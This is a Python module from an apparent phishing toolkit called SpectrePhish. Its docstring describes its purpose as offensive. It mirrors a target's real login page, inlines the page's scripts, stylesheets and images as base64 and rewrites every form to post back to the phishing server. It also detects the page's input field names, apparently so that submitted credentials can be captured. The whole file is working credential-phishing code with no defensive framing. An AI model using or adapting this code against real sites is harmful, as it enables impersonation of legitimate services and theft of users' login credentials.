"""
SpectrePhish :: core/landing.py
Landing pages plus real-site mirroring.

Offensive logic: a mirrored page beats a hand-built one every time. Fetch the
target's actual login page, inline its assets, and rewrite the form.

Author : Inayat Hussain
"""

from __future__ import annotations

import base64
import os

import requests
from bs4 import BeautifulSoup

from config import LANDING_DIR

ASSET_TAGS = (("link", "href"), ("script", "src"), ("img", "src"))


def save_landing(name: str, html: str) -> str:
    os.makedirs(LANDING_DIR, exist_ok=True)
    path = os.path.join(LANDING_DIR, f"{name}.html")
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(html)
    return path


def load_landing(name: str) -> str:
    path = os.path.join(LANDING_DIR, f"{name}.html")
    if os.path.isfile(path):
        with open(path, encoding="utf-8", errors="ignore") as handle:
            return handle.read()
    return ""


def mirror(url: str, timeout: int = 20, inline_assets: bool = True,
           max_asset_bytes: int = 400_000) -> str:
    resp = requests.get(url, timeout=timeout, verify=False,
                        headers={"User-Agent": "Mozilla/5.0 SpectrePhish/1.1"})
    resp.raise_for_status()
    soup = BeautifulSoup(resp.text, "html.parser")

    if inline_assets:
        for tag_name, attr in ASSET_TAGS:
            for tag in soup.find_all(tag_name):
                src = tag.get(attr)
                if not src or src.startswith("data:"):
                    continue
                absolute = requests.compat.urljoin(url, src)
                try:
                    asset = requests.get(absolute, timeout=timeout, verify=False)
                    if len(asset.content) > max_asset_bytes:
                        continue
                    ctype = (asset.headers.get("Content-Type") or "").split(";")[0]
                    if not ctype:
                        continue
                    data = base64.b64encode(asset.content).decode()
                    tag[attr] = f"data:{ctype};base64,{data}"
                except Exception:
                    continue

    for form in soup.find_all("form"):
        form["action"] = ""
        if form.get("method"):
            form["method"] = "POST"

    head = soup.find("head")
    if head and not soup.find("base"):
        tag = soup.new_tag("base", href=url)
        head.insert(0, tag)

    return str(soup)


def detect_fields(html: str) -> list:
    soup = BeautifulSoup(html or "", "html.parser")
    fields = []
    for tag in soup.find_all(("input", "textarea", "select")):
        name = tag.get("name")
        if name and name.lower() not in ("submit", "reset", "button"):
            fields.append(name)
    return fields
